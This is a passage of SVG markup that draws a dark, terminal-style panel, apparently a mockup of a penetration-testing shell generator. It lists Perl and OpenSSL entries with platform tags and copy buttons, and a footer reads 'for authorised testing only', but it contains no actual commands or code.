  <rect x="132" y="371" width="36" height="13" rx="2" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="150" y="381" text-anchor="middle" font-size="7.5" fill="#f0c060">linux</text>
  <rect x="174" y="371" width="32" height="13" rx="2" fill="#001620" stroke="#105a70" stroke-width="1"/>
  <text x="190" y="381" text-anchor="middle" font-size="7.5" fill="#60c0f0">mac</text>
  <rect x="738" y="371" width="54" height="13" rx="2" fill="transparent" stroke="#1a4a1a" stroke-width="1"/>
  <text x="765" y="381" text-anchor="middle" font-size="7.5" fill="#555">copy</text>

  <!-- Shell item 3 — collapsed -->
  <rect x="22" y="392" width="780" height="24" rx="3" fill="#060f06" stroke="#1a3a1a" stroke-width="1"/>
  <text x="34" y="408" font-size="10" fill="#00cc00" font-weight="bold">Perl</text>
  <rect x="72" y="401" width="36" height="13" rx="2" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="90" y="411" text-anchor="middle" font-size="7.5" fill="#f0c060">linux</text>
  <rect x="114" y="401" width="32" height="13" rx="2" fill="#001620" stroke="#105a70" stroke-width="1"/>
  <text x="130" y="411" text-anchor="middle" font-size="7.5" fill="#60c0f0">mac</text>
  <rect x="738" y="401" width="54" height="13" rx="2" fill="transparent" stroke="#1a4a1a" stroke-width="1"/>
  <text x="765" y="411" text-anchor="middle" font-size="7.5" fill="#555">copy</text>

  <!-- Shell item 4 — encrypted (gold) -->
  <rect x="22" y="422" width="780" height="24" rx="3" fill="#060f06" stroke="#3a3010" stroke-width="1"/>
  <rect x="22" y="422" width="780" height="24" rx="3" fill="rgba(58,48,16,0.3)"/>
  <text x="34" y="438" font-size="10" fill="#00cc00" font-weight="bold">OpenSSL</text>
  <rect x="98" y="431" width="36" height="13" rx="2" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="116" y="441" text-anchor="middle" font-size="7.5" fill="#f0c060">linux</text>
  <rect x="140" y="431" width="50" height="13" rx="2" fill="#1a1200" stroke="#604a00" stroke-width="1"/>
  <text x="165" y="441" text-anchor="middle" font-size="7.5" fill="#e0c030">🔒 enc</text>
  <rect x="738" y="431" width="54" height="13" rx="2" fill="transparent" stroke="#1a4a1a" stroke-width="1"/>
  <text x="765" y="441" text-anchor="middle" font-size="7.5" fill="#555">copy</text>

  <!-- footer -->
  <text x="410" y="472" text-anchor="middle" font-size="8" fill="#222" letter-spacing="2">@BENJITRAPP  |  FOR AUTHORISED TESTING ONLY</text>

</svg>
